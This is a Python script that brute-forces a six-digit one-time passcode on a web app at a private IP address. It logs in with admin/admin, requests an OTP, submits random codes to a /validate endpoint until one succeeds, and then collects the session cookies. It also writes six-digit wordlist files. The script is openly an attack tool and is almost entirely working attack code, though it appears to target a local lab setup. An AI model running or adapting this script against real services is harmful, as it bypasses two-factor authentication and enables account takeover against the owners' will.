def generate():
    f = open("passwords.txt", "a")
    for i in range(10):
        for j in range(10):
            for k in range(10):
                for l in range(10):
                    for m in range(10):
                        for n in range(10):
                            f.write(f"{i}{j}{k}{l}{m}{n}\n")
    f.close()

def generate_random():
    f = open("passwords_rand.txt", "a")
    for i in range(999999):
        i = random.randint(0,9)
        j = random.randint(0,9)
        k = random.randint(0,9)
        l = random.randint(1,9)
        m = random.randint(1,9)
        n = random.randint(1,9)
        f.write(f"{i}{j}{k}{l}{m}{n}\n")
    f.close()

import requests
import random
import time
def crack(session):
    url = "http://192.168.0.117:8080/validate"
    finished = False
    count = 0
    password = '{:06d}'.format(random.randint(0, 999999))
    start_time = time.time()

    while not finished:
        if time.time() - start_time > 30:
            print("Time limit reached. Cracking process stopped.")
            print("Attempts: ", count)
            return False
            
        
        # Define the JSON payload
        json_payload = {
            "code": password
        }

        # Send the POST request with JSON payload
        response = session.post(url, data=json_payload)
        count += 1
        data = response.json().get("result")
        print(data)

        if data == "success":
            print("Request successful")
            print("Valid password:", password)
            finished = True
            return True
        else:
            print("Request failed with password:", password, "| Status code:", response.status_code) 

        # Generate a new random password for the next iteration
        password = '{:06d}'.format(random.randint(0, 999999))

        # Call the function to attempt cracking
def start():
    with requests.Session() as session:
        # Log in
        login_url = "http://192.168.0.117:8080/logging"
        login_payload = {"username": "admin", "password": "admin"}
        login_response = session.post(login_url, json=login_payload)
        login_response.raise_for_status()  # Raise an exception if login fails

        # Obtain OTP
        otp_url = "http://192.168.0.117:8080/otp"
        otp_response = session.get(otp_url)
        otp_response.raise_for_status()  # Raise an exception if GET request fails

        success = crack(session)
        if not success:
            return
        # Get cookies from /directsuccess
        directsuccess_url = "http://192.168.0.117:8080/directsuccess"
        directsuccess_response = session.get(directsuccess_url)
        directsuccess_response.raise_for_status()  # Raise an exception if GET request fails
        print("Cookies obtained from /directsuccess:", session.cookies)

        # Get logged in status
        loggedin_url = "http://192.168.0.117:8080/loggedin"
        loggedin_response = session.get(loggedin_url)
        loggedin_response.raise_for_status()  # Raise an exception if GET request fails
        print("Logged in status:", loggedin_response.text)

        logged_out_url = "http://192.168.0.117:8080/logout"
        logged_out_response = session.post(logged_out_url)
        logged_out_response.raise_for_status()  # Raise an exception if GET request fails
        print("Logged in status:", logged_out_response.text)

        otp_url = "http://192.168.0.117:8080/"
        otp_response = session.get(otp_url)
        otp_response.raise_for_status()  # Raise an exception if GET request fails
        session.close()

import multiprocessing
# Crack password
if __name__ == "__main__":
    # Create two processes to crack password
    generate_random()
    #p1 = multiprocessing.Process(target=start)
    #p2 = multiprocessing.Process(target=start)
    #p1.start()
    #p2.start()
    #p1.join()
    #p2.join()